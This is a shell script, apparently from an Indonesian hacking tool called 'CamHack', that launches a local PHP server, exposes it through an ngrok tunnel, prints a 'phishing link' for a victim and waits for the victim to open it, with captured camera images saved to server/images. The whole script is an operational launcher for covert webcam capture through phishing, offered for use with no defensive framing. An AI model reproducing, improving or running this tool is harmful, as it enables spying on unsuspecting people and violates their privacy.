#!/usr/bin/sh

bi='\033[34;1m' #biru
ij='\033[32;1m' #ijo
pr='\033[35;1m' #purple
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah
pu='\033[37;1m' #putih
ku='\033[33;1m' #kuning
or='\033[1;38;5;208m' #Orange


menunggu(){
  echo "$bi[$pu+$bi] Menunggu korban membuka link .!!!"
  while [ true ]; do


  if [ -e "Log.log" ]; then
  echo "$ij[$pu+$ij]$pu Target membuka (Save to: server/images)"
  rm -rf Log.log
  fi

  done
}


ngrok(){
  echo "$bi[$pu+$bi] Start php server...!!"
  php -t "server/" -S 0.0.0.0:3333 > /dev/null 2>&1 &
  sleep 1
  echo "$bi[$pu+$bi] Start ngrok server...!!"
  ngrok http 3333 > /dev/null 2>&1 &
  sleep 3
  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[0].public_url')
  echo 
  echo "$cy[$pu+$cy] Link phising:$pu" $link
  sleep 3
  menunggu
}
banner(){
    echo """$or
    \t\t\t        ___
    \t\t\t       ( _ )   I see you.....
    \t\t\t      | / \ |
    \t\t\t      | \_/ |
    \t\t\t       \___/ ___
    \t\t\t       _|_|_/[_]\__==_
    \t\t\t      [---------------]
    \t\t\t      | O   /---\     |
    \t\t\t      |    |     |    |
    \t\t\t      |     \___/     |
    \t\t\t      [---------------]
    \t\t\t            [___]    
    """
    sleep 0.99
    echo "$bi [$ku + $bi]══════[ $me Author : @HedyFake $ku _-\|/-_ $me Twiter:@iAmHere96509064 $bi ]══════[$ku + $bi]"
    echo "\t\t╔──────────────────────────────────────────────╗"
    echo "\t\t|              $pu CamHack Version 0.01 $ij          |"
    echo "\t\t|              $pu What just happened? $ij           |"
    echo "\t\t┖──────────────────────────────────────────────┙"
    sleep 0.05
    echo
}

banner
ngrok
